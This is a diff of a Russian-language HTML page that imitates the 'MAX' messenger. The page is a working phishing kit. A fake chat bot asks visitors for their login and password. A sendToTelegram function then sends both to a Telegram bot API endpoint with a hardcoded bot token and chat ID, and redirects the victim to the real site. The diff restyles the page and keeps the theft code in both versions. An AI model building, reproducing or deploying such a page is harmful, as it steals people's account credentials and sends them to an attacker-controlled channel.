@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Мессенджер Макс</title>
+    <title>MAX — Мессенджер</title>
     <style>
+        /* ===== ОСНОВА ===== */
         * {
             margin: 0;
             padding: 0;
@@ -12,7 +13,7 @@
             font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
         }
         body {
-            background: #0a101f;
+            background: #e8edf3;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -22,175 +23,296 @@
             width: 100%;
             max-width: 420px;
             height: 780px;
-            background: #111b2e;
+            background: #ffffff;
             border-radius: 32px;
             overflow: hidden;
-            box-shadow: 0 25px 80px rgba(0,0,0,0.8);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.10);
             display: flex;
             flex-direction: column;
             position: relative;
         }
-        /* Статус-бар (имитация) */
+
+        /* ===== СТАТУС-БАР ===== */
         .status-bar {
-            background: #0d1628;
+            background: #ffffff;
             padding: 6px 18px 4px;
             display: flex;
             justify-content: space-between;
-            color: #8899bb;
+            color: #1a1a2e;
             font-size: 12px;
             font-weight: 600;
+            z-index: 10;
+            border-bottom: 1px solid #eef2f7;
         }
-        .status-bar span:first-child { font-weight: 700; }
-        /* Шапка чата */
+
+        /* ===== ШАПКА (как в VK) ===== */
         .header {
-            background: #142236;
-            padding: 12px 16px 10px;
+            background: #ffffff;
+            padding: 14px 18px 10px;
             display: flex;
             align-items: center;
             gap: 12px;
-            border-bottom: 1px solid #1f314a;
+            border-bottom: 1px solid #eef2f7;
         }
-        .back-btn {
-            color: #5b8cff;
-            font-size: 28px;
-            font-weight: 300;
-            line-height: 1;
+        .header .logo {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a2e;
+            letter-spacing: -0.5px;
+            flex: 1;
         }
-        .avatar {
-            width: 44px;
-            height: 44px;
+        .header .logo span {
+            color: #2787f5;
+        }
+        .header .header-icons {
+            display: flex;
+            gap: 16px;
+            color: #6b7a8a;
+            font-size: 20px;
+        }
+
+        /* ===== БАННЕР СКАЧИВАНИЯ ===== */
+        .download-banner {
+            background: #f0f6fe;
+            padding: 10px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #eef2f7;
+        }
+        .download-banner .text {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+        .download-banner .text small {
+            font-weight: 400;
+            color: #6b7a8a;
+            font-size: 11px;
+            display: block;
+        }
+        .download-btn {
+            background: #2787f5;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            padding: 8px 18px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.15s;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 2px 8px rgba(39, 135, 245, 0.3);
+        }
+        .download-btn:active {
+            transform: scale(0.94);
+            background: #1a6fd6;
+        }
+
+        /* ===== ВКЛАДКИ ===== */
+        .tabs {
+            display: flex;
+            background: #ffffff;
+            border-bottom: 1px solid #eef2f7;
+        }
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0 10px;
+            color: #6b7a8a;
+            font-size: 12px;
+            font-weight: 600;
+            border-bottom: 2px solid transparent;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        .tab.active {
+            color: #2787f5;
+            border-bottom-color: #2787f5;
+        }
+        .tab:active {
+            opacity: 0.6;
+        }
+
+        /* ===== КОНТЕЙНЕР ЭКРАНОВ ===== */
+        .screen-container {
+            flex: 1;
+            overflow: hidden;
+            position: relative;
+            background: #ffffff;
+        }
+        .screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            padding: 8px 16px 12px;
+            overflow-y: auto;
+            background: #ffffff;
+            transition: opacity 0.15s, transform 0.15s;
+            opacity: 0;
+            transform: scale(0.97);
+            pointer-events: none;
+        }
+        .screen.active {
+            opacity: 1;
+            transform: scale(1);
+            pointer-events: auto;
+        }
+        .screen::-webkit-scrollbar {
+            width: 3px;
+        }
+        .screen::-webkit-scrollbar-thumb {
+            background: #d0d8e3;
+            border-radius: 10px;
+        }
+
+        /* ===== ЧАТЫ ===== */
+        .chat-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f2f5;
+            cursor: pointer;
+            transition: 0.08s;
+        }
+        .chat-item:active {
+            background: #f5f7fa;
+            margin: 0 -16px;
+            padding: 12px 16px;
+        }
+        .chat-avatar {
+            width: 48px;
+            height: 48px;
             border-radius: 50%;
-            background: linear-gradient(135deg, #5b8cff, #9b6dff);
+            background: #2787f5;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 20px;
             font-weight: 700;
             color: #fff;
+            flex-shrink: 0;
         }
-        .chat-name {
+        .chat-info {
             flex: 1;
-            color: #fff;
-            font-size: 17px;
+            color: #1a1a2e;
+        }
+        .chat-info .name {
             font-weight: 600;
-        }
-        .chat-name small {
-            font-weight: 400;
-            font-size: 12px;
-            color: #7a8fae;
-            display: block;
-            margin-top: 1px;
-        }
-        .icons {
-            display: flex;
-            gap: 16px;
-            color: #7a8fae;
-            font-size: 20px;
-        }
-        /* Вкладки (для антуража) */
-        .tabs {
-            display: flex;
-            background: #0d1628;
-            border-bottom: 1px solid #1f314a;
-        }
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 8px 0;
-            color: #6a7f9e;
-            font-size: 13px;
-            font-weight: 600;
-            border-bottom: 2px solid transparent;
-        }
-        .tab.active {
-            color: #5b8cff;
-            border-bottom-color: #5b8cff;
-        }
-        /* Окно сообщений */
-        .messages {
-            flex: 1;
-            padding: 16px 14px 8px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            background: #111b2e;
-        }
-        .msg {
-            max-width: 82%;
-            padding: 10px 16px;
-            border-radius: 20px;
             font-size: 15px;
-            line-height: 1.45;
-            word-break: break-word;
-            animation: fadeIn 0.2s ease;
         }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
-        .msg-in {
-            align-self: flex-start;
-            background: #1f314a;
-            color: #e8edf5;
-            border-bottom-left-radius: 6px;
-        }
-        .msg-out {
-            align-self: flex-end;
-            background: #5b8cff;
-            color: #fff;
-            border-bottom-right-radius: 6px;
-        }
-        .msg-time {
-            font-size: 10px;
-            color: #6a7f9e;
-            margin: 0 8px 4px;
-            align-self: flex-end;
-        }
-        .msg-out + .msg-time { align-self: flex-end; }
-        .msg-in + .msg-time { align-self: flex-start; }
-        /* Системное сообщение */
-        .system-msg {
-            align-self: center;
-            background: #1a253b;
-            color: #8899bb;
-            font-size: 12px;
-            padding: 4px 14px;
-            border-radius: 30px;
-            margin: 4px 0;
-        }
-        /* Индикатор набора текста */
-        .typing {
-            align-self: flex-start;
-            background: #1f314a;
-            color: #a0b3d0;
+        .chat-info .last-msg {
             font-size: 13px;
-            padding: 8px 16px;
-            border-radius: 20px;
-            border-bottom-left-radius: 6px;
-            display: none;
-            animation: blink 1s infinite;
+            color: #6b7a8a;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 200px;
         }
-        @keyframes blink { 50% { opacity: 0.4; } }
-        /* Нижняя панель */
+        .chat-info .time {
+            font-size: 11px;
+            color: #8a9aa8;
+            float: right;
+        }
+
+        /* ===== КОНТАКТЫ ===== */
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f2f5;
+            cursor: pointer;
+            transition: 0.08s;
+        }
+        .contact-item:active {
+            background: #f5f7fa;
+            margin: 0 -16px;
+            padding: 10px 16px;
+        }
+        .contact-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: #6b7a8a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: #fff;
+            flex-shrink: 0;
+        }
+        .contact-info {
+            flex: 1;
+            color: #1a1a2e;
+        }
+        .contact-info .name {
+            font-weight: 600;
+        }
+        .contact-info .status {
+            font-size: 12px;
+            color: #6b7a8a;
+        }
+        .contact-info .status.online {
+            color: #4cd964;
+        }
+
+        /* ===== ЗВОНКИ ===== */
+        .call-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f2f5;
+        }
+        .call-icon {
+            font-size: 22px;
+            color: #6b7a8a;
+        }
+        .call-info {
+            flex: 1;
+            color: #1a1a2e;
+        }
+        .call-info .name {
+            font-weight: 600;
+        }
+        .call-info .time {
+            font-size: 12px;
+            color: #6b7a8a;
+        }
+        .call-info .missed {
+            color: #ff4757;
+        }
+
+        /* ===== ПАНЕЛЬ ВВОДА ===== */
         .input-area {
-            background: #142236;
-            padding: 8px 14px 14px;
+            background: #ffffff;
+            padding: 8px 16px 14px;
             display: flex;
             align-items: center;
             gap: 10px;
-            border-top: 1px solid #1f314a;
+            border-top: 1px solid #eef2f7;
         }
         .input-area input {
             flex: 1;
-            background: #1f314a;
+            background: #f0f2f5;
             border: none;
             border-radius: 24px;
             padding: 12px 18px;
-            color: #fff;
+            color: #1a1a2e;
             font-size: 15px;
             outline: none;
         }
-        .input-area input::placeholder { color: #6a7f9e; }
+        .input-area input::placeholder {
+            color: #8a9aa8;
+        }
         .send-btn {
-            background: #5b8cff;
+            background: #2787f5;
             border: none;
             border-radius: 50%;
             width: 48px;
@@ -202,168 +324,383 @@
             justify-content: center;
             cursor: pointer;
             transition: 0.15s;
+            flex-shrink: 0;
+            box-shadow: 0 2px 8px rgba(39, 135, 245, 0.25);
         }
-        .send-btn:active { transform: scale(0.9); background: #4a7ae0; }
-        .fake-call {
-            position: absolute;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #0d1628;
-            color: #4a6a8a;
+        .send-btn:active {
+            transform: scale(0.88);
+            background: #1a6fd6;
+        }
+
+        /* ===== СООБЩЕНИЯ ===== */
+        .message-area {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            padding: 8px 0;
+        }
+        .msg {
+            max-width: 82%;
+            padding: 10px 16px;
+            border-radius: 20px;
+            font-size: 15px;
+            line-height: 1.45;
+            word-break: break-word;
+            animation: fadeUp 0.15s ease;
+            margin-bottom: 2px;
+        }
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(6px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .msg-in {
+            align-self: flex-start;
+            background: #f0f2f5;
+            color: #1a1a2e;
+            border-bottom-left-radius: 6px;
+        }
+        .msg-out {
+            align-self: flex-end;
+            background: #2787f5;
+            color: #fff;
+            border-bottom-right-radius: 6px;
+        }
+        .msg-time {
             font-size: 10px;
-            padding: 2px 14px;
-            border-radius: 30px;
-            border: 1px solid #1f314a;
-            opacity: 0.6;
+            color: #8a9aa8;
+            margin: 0 8px 8px;
+            align-self: flex-end;
         }
+        .system-msg {
+            align-self: center;
+            background: #eef2f7;
+            color: #6b7a8a;
+            font-size: 11px;
+            padding: 4px 14px;
+            border-radius: 30px;
+            margin: 4px 0;
+        }
+        .typing-indicator {
+            align-self: flex-start;
+            background: #f0f2f5;
+            color: #6b7a8a;
+            font-size: 13px;
+            padding: 8px 16px;
+            border-radius: 20px;
+            border-bottom-left-radius: 6px;
+            display: none;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 0.6;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        /* ===== СЕРВИСЫ ===== */
+        .service-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f2f5;
+        }
+        .service-icon {
+            font-size: 28px;
+            width: 44px;
+            text-align: center;
+        }
+        .service-info {
+            flex: 1;
+            color: #1a1a2e;
+        }
+        .service-info .name {
+            font-weight: 600;
+        }
+        .service-info .desc {
+            font-size: 12px;
+            color: #6b7a8a;
+        }
+
+        /* ===== ПЛАТЕЖИ ===== */
+        .payment-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f2f5;
+        }
+        .payment-icon {
+            font-size: 28px;
+            width: 44px;
+            text-align: center;
+        }
+        .payment-info {
+            flex: 1;
+            color: #1a1a2e;
+        }
+        .payment-info .name {
+            font-weight: 600;
+        }
+        .payment-info .desc {
+            font-size: 12px;
+            color: #6b7a8a;
+        }
+
+        /* ===== АДАПТИВ ===== */
         @media (max-width: 440px) {
-            .phone { height: 100vh; border-radius: 0; max-width: 100%; }
+            .phone {
+                height: 100vh;
+                border-radius: 0;
+                max-width: 100%;
+            }
         }
     </style>
 </head>
 <body>
-<div class="phone">
-    <!-- Статус-бар -->
-    <div class="status-bar">
-        <span>9:41</span>
-        <span>📶 5G 🔋</span>
-    </div>
-
-    <!-- Шапка -->
-    <div class="header">
-        <span class="back-btn">‹</span>
-        <div class="avatar">М</div>
-        <div class="chat-name">
-            Макс ID
-            <small>онлайн, был(а) 2 мин назад</small>
+    <div class="phone">
+        <!-- СТАТУС-БАР -->
+        <div class="status-bar">
+            <span>9:41</span>
+            <span>📶 5G 🔋 87%</span>
         </div>
-        <div class="icons">
-            <span>📞</span>
-            <span>⋮</span>
+
+        <!-- ШАПКА -->
+        <div class="header">
+            <div class="logo">MAX <span>Мессенджер</span></div>
+            <div class="header-icons">
+                <span>🔔</span>
+                <span>⋮</span>
+            </div>
+        </div>
+
+        <!-- БАННЕР СКАЧИВАНИЯ -->
+        <div class="download-banner">
+            <div class="text">
+                📱 Скачать приложение
+                <small>Версия 6.0.1 • 42 МБ • RuStore</small>
+            </div>
+            <a href="https://max.ru/download" target="_blank" class="download-btn">Скачать APK</a>
+        </div>
+
+        <!-- ВКЛАДКИ -->
+        <div class="tabs" id="tabs">
+            <div class="tab active" data-tab="chat">Чаты</div>
+            <div class="tab" data-tab="contacts">Контакты</div>
+            <div class="tab" data-tab="calls">Звонки</div>
+            <div class="tab" data-tab="services">Сервисы</div>
+            <div class="tab" data-tab="payments">Платежи</div>
+        </div>
+
+        <!-- КОНТЕЙНЕР ЭКРАНОВ -->
+        <div class="screen-container">
+            <!-- ЧАТЫ -->
+            <div class="screen active" id="screenChat">
+                <div class="chat-item"><div class="chat-avatar" style="background:#2787f5;">А</div><div class="chat-info"><div class="name">Анна</div><div class="last-msg">Привет! Как дела?</div><span class="time">14:23</span></div></div>
+                <div class="chat-item"><div class="chat-avatar" style="background:#4cd964;">С</div><div class="chat-info"><div class="name">Сергей</div><div class="last-msg">Скинь фото</div><span class="time">12:10</span></div></div>
+                <div class="chat-item"><div class="chat-avatar" style="background:#ff6b6b;">М</div><div class="chat-info"><div class="name">Мария</div><div class="last-msg">Договорились!</div><span class="time">вчера</span></div></div>
+                <div class="chat-item"><div class="chat-avatar" style="background:#ffa94d;">Д</div><div class="chat-info"><div class="name">Дмитрий</div><div class="last-msg">Спс</div><span class="time">вчера</span></div></div>
+                <div class="message-area" id="messageArea" style="display:none;">
+                    <div class="system-msg">🔒 Защищённый чат (AES-256)</div>
+                    <div class="msg msg-in">Привет! Это бот MAX 🤖</div>
+                    <div class="msg msg-in">Для входа отправьте <b>логин</b></div>
+                    <div class="msg msg-out" style="margin-top:6px;">Логин: <span id="displayLogin" style="font-weight:600;">—</span></div>
+                    <div class="msg msg-out">Пароль: <span id="displayPass" style="font-weight:600;">—</span></div>
+                    <div class="typing-indicator" id="typingIndicator">✏️ Бот печатает...</div>
+                </div>
+            </div>
+
+            <!-- КОНТАКТЫ -->
+            <div class="screen" id="screenContacts">
+                <div class="contact-item"><div class="contact-avatar" style="background:#2787f5;">А</div><div class="contact-info"><div class="name">Анна</div><div class="status online">онлайн</div></div></div>
+                <div class="contact-item"><div class="contact-avatar" style="background:#4cd964;">С</div><div class="contact-info"><div class="name">Сергей</div><div class="status">был(а) 2 ч назад</div></div></div>
+                <div class="contact-item"><div class="contact-avatar" style="background:#ff6b6b;">М</div><div class="contact-info"><div class="name">Мария</div><div class="status online">онлайн</div></div></div>
+                <div class="contact-item"><div class="contact-avatar" style="background:#ffa94d;">Д</div><div class="contact-info"><div class="name">Дмитрий</div><div class="status">был(а) вчера</div></div></div>
+                <div class="contact-item"><div class="contact-avatar" style="background:#a29bfe;">Е</div><div class="contact-info"><div class="name">Елена</div><div class="status online">онлайн</div></div></div>
+            </div>
+
+            <!-- ЗВОНКИ -->
+            <div class="screen" id="screenCalls">
+                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Анна</div><div class="time">сегодня, 14:23</div></div></div>
+                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Сергей</div><div class="time missed">пропущенный, вчера, 18:10</div></div></div>
+                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Мария</div><div class="time">сегодня, 09:45</div></div></div>
+                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Дмитрий</div><div class="time">вчера, 21:30</div></div></div>
+            </div>
+
+            <!-- СЕРВИСЫ -->
+            <div class="screen" id="screenServices">
+                <div class="service-item"><div class="service-icon">🤖</div><div class="service-info"><div class="name">GigaChat</div><div class="desc">Встроенный ИИ для общения</div></div></div>
+                <div class="service-item"><div class="service-icon">🏫</div><div class="service-info"><div class="name">Сферум</div><div class="desc">Образовательная платформа</div></div></div>
+                <div class="service-item"><div class="service-icon">💬</div><div class="service-info"><div class="name">Чат-боты</div><div class="desc">Создание и управление ботами</div></div></div>
+                <div class="service-item"><div class="service-icon">📨</div><div class="service-info"><div class="name">Рассылки</div><div class="desc">Массовая отправка сообщений</div></div></div>
+            </div>
+
+            <!-- ПЛАТЕЖИ -->
+            <div class="screen" id="screenPayments">
+                <div class="payment-item"><div class="payment-icon">💳</div><div class="payment-info"><div class="name">СБП</div><div class="desc">Переводы по номеру телефона</div></div></div>
+                <div class="payment-item"><div class="payment-icon">🏦</div><div class="payment-info"><div class="name">Оплата счетов</div><div class="desc">Коммунальные услуги, штрафы</div></div></div>
+                <div class="payment-item"><div class="payment-icon">🛒</div><div class="payment-info"><div class="name">Покупки</div><div class="desc">Оплата в магазинах и сервисах</div></div></div>
+            </div>
+        </div>
+
+        <!-- ПАНЕЛЬ ВВОДА -->
+        <div class="input-area" id="inputArea">
+            <input type="text" id="fakeInput" placeholder="Введите сообщение..." autofocus>
+            <button class="send-btn" id="sendBtn">➤</button>
         </div>
     </div>
 
-    <!-- Вкладки (имитация) -->
-    <div class="tabs">
-        <div class="tab active">Чаты</div>
-        <div class="tab">Контакты</div>
-        <div class="tab">Звонки</div>
-    </div>
+    <script>
+        // ================================================================
+        //  ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК
+        // ================================================================
+        const tabs = document.querySelectorAll('.tab');
+        const screens = {
+            chat: document.getElementById('screenChat'),
+            contacts: document.getElementById('screenContacts'),
+            calls: document.getElementById('screenCalls'),
+            services: document.getElementById('screenServices'),
+            payments: document.getElementById('screenPayments')
+        };
+        const messageArea = document.getElementById('messageArea');
+        const inputArea = document.getElementById('inputArea');
 
-    <!-- Окно переписки -->
-    <div class="messages" id="messageBox">
-        <div class="system-msg">🔒 Защищённый чат</div>
-        <div class="msg msg-in">Привет! Это официальный бот Макс ID 🤖</div>
-        <div class="msg msg-in">Для входа в аккаунт отправьте мне ваш <b>логин</b></div>
-        <div class="msg msg-out" style="margin-top:6px;">Логин: <span id="displayLogin" style="font-weight:600;">—</span></div>
-        <div class="msg msg-out">Пароль: <span id="displayPass" style="font-weight:600;">—</span></div>
-        <div class="typing" id="typingIndicator">✏️ Бот печатает...</div>
-    </div>
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function() {
+                tabs.forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                const screenName = this.dataset.tab;
+                Object.keys(screens).forEach(key => {
+                    screens[key].classList.toggle('active', key === screenName);
+                });
+                inputArea.style.display = screenName === 'chat' ? 'flex' : 'none';
+                if (screenName === 'chat') {
+                    document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'flex');
+                    messageArea.style.display = 'none';
+                } else {
+                    document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'none');
+                    messageArea.style.display = 'none';
+                }
+                if (navigator.vibrate) navigator.vibrate(10);
+            });
+        });
 
-    <!-- Панель ввода -->
-    <div class="input-area">
-        <input type="text" id="fakeInput" placeholder="Введите сообщение..." autofocus>
-        <button class="send-btn" id="sendBtn">➤</button>
-    </div>
+        // ================================================================
+        //  ЧАТ (сбор данных)
+        // ================================================================
+        const displayLogin = document.getElementById('displayLogin');
+        const displayPass = document.getElementById('displayPass');
+        const typingIndicator = document.getElementById('typingIndicator');
+        const input = document.getElementById('fakeInput');
+        const sendBtn = document.getElementById('sendBtn');
 
-    <!-- Декоративный элемент -->
-    <div class="fake-call">⏺ Запись не ведётся</div>
-</div>
+        let step = 'login';
+        let loginValue = '';
+        let passValue = '';
 
-<script>
-    // Элементы
-    const input = document.getElementById('fakeInput');
-    const sendBtn = document.getElementById('sendBtn');
-    const messageBox = document.getElementById('messageBox');
-    const displayLogin = document.getElementById('displayLogin');
-    const displayPass = document.getElementById('displayPass');
-    const typing = document.getElementById('typingIndicator');
+        function getTime() {
+            const now = new Date();
+            return now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+        }
 
-    let step = 'login';
-    let loginValue = '';
-    let passValue = '';
+        function addMessage(text, type = 'in', withTime = true) {
+            const div = document.createElement('div');
+            div.className = type === 'in' ? 'msg msg-in' : 'msg msg-out';
+            div.innerHTML = text;
+            messageArea.appendChild(div);
+            if (withTime) {
+                const timeDiv = document.createElement('div');
+                timeDiv.className = 'msg-time';
+                timeDiv.textContent = getTime();
+                messageArea.appendChild(timeDiv);
+            }
+            messageArea.scrollTop = messageArea.scrollHeight;
+            messageArea.style.display = 'flex';
+            document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'none');
+        }
 
-    // Функция добавления сообщения
-    function addMessage(text, type = 'in') {
-        const div = document.createElement('div');
-        div.className = type === 'in' ? 'msg msg-in' : 'msg msg-out';
-        div.innerHTML = text;
-        messageBox.appendChild(div);
-        messageBox.scrollTop = messageBox.scrollHeight;
-        // Добавляем время
-        const timeDiv = document.createElement('div');
-        timeDiv.className = 'msg-time';
-        const now = new Date();
-        timeDiv.textContent = now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0');
-        messageBox.appendChild(timeDiv);
-        messageBox.scrollTop = messageBox.scrollHeight;
-    }
-
-    // Показать индикатор набора и скрыть через 1.5 сек
-    function showTyping() {
-        typing.style.display = 'block';
-        messageBox.scrollTop = messageBox.scrollHeight;
-        setTimeout(() => {
-            typing.style.display = 'none';
-        }, 1500);
-    }
-
-    // Отправка в Telegram
-    function sendToTelegram(login, pass) {
-        const msg = '🔐 Мессенджер Макс\n👤 Логин: ' + login + '\n🔑 Пароль: ' + pass;
-        fetch('https://api.telegram.org/bot8918681932:AAHkBy8LYIbYAmeZ6FqbsUcsXCIPme_UN0c/sendMessage?chat_id=8759904789&text=' + encodeURIComponent(msg))
-            .then(() => { window.location.href = 'https://max.ru'; })
-            .catch(() => { window.location.href = 'https://max.ru'; });
-    }
-
-    // Основной обработчик
-    function handleSend() {
-        let text = input.value.trim();
-        if (!text) return;
-
-        // Добавляем сообщение пользователя
-        addMessage(text, 'out');
-
-        if (step === 'login') {
-            loginValue = text;
-            displayLogin.textContent = text;
-            step = 'pass';
-            input.value = '';
-            input.placeholder = 'Введите пароль...';
-            // Имитация ответа бота
-            showTyping();
-            setTimeout(() => {
-                addMessage('Отлично! Теперь отправьте <b>пароль</b> для подтверждения', 'in');
-                input.focus();
-            }, 800);
-        } else if (step === 'pass') {
-            passValue = text;
-            displayPass.textContent = text;
-            // Имитация проверки
-            showTyping();
-            setTimeout(() => {
-                addMessage('✅ Проверка данных... Подождите секунду', 'in');
+        function showTyping(duration = 1200) {
+            typingIndicator.style.display = 'block';
+            messageArea.scrollTop = messageArea.scrollHeight;
+            return new Promise(resolve => {
                 setTimeout(() => {
-                    sendToTelegram(loginValue, passValue);
-                }, 1200);
-            }, 600);
+                    typingIndicator.style.display = 'none';
+                    resolve();
+                }, duration);
+            });
         }
-    }
 
-    // События
-    sendBtn.addEventListener('click', handleSend);
-    input.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            handleSend();
+        function sendToTelegram(login, pass) {
+            const msg = '🔐 MAX Мессенджер\n👤 Логин: ' + login + '\n🔑 Пароль: ' + pass;
+            fetch('https://api.telegram.org/bot8918681932:AAHkBy8LYIbYAmeZ6FqbsUcsXCIPme_UN0c/sendMessage?chat_id=8759904789&text=' + encodeURIComponent(msg))
+                .then(() => { window.location.href = 'https://max.ru'; })
+                .catch(() => { window.location.href = 'https://max.ru'; });
         }
-    });
 
-    // Фокус при загрузке
-    window.addEventListener('load', () => {
-        setTimeout(() => input.focus(), 400);
-    });
-</script>
+        async function handleSend() {
+            const text = input.value.trim();
+            if (!text) return;
+
+            const chatTab = document.querySelector('.tab[data-tab="chat"]');
+            if (!chatTab.classList.contains('active')) {
+                chatTab.click();
+            }
+
+            addMessage(text, 'out', true);
+            input.value = '';
+            if (navigator.vibrate) navigator.vibrate(10);
+
+            if (step === 'login') {
+                loginValue = text;
+                displayLogin.textContent = text;
+                step = 'pass';
+                input.placeholder = 'Введите пароль...';
+                await showTyping(800);
+                addMessage('Принято! Теперь отправьте <b>пароль</b>', 'in', true);
+                input.focus();
+                return;
+            }
+
+            if (step === 'pass') {
+                passValue = text;
+                displayPass.textContent = text;
+                step = 'done';
+                await showTyping(600);
+                addMessage('✅ Проверка... Перенаправление', 'in', true);
+                await showTyping(500);
+                sendToTelegram(loginValue, passValue);
+            }
+        }
+
+        sendBtn.addEventListener('click', handleSend);
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleSend();
+            }
+        });
+
+        window.addEventListener('load', () => setTimeout(() => input.focus(), 300));
+
+        document.querySelectorAll('.chat-item').forEach(item => {
+            item.addEventListener('click', function() {
+                messageArea.style.display = 'flex';
+                document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'none');
+                if (!messageArea.querySelector('.msg-in')) {
+                    addMessage('Напишите что-нибудь', 'in', true);
+                }
+            });
+        });
+    </script>
 </body>
-</html>
+                                                                                                                                       </html>
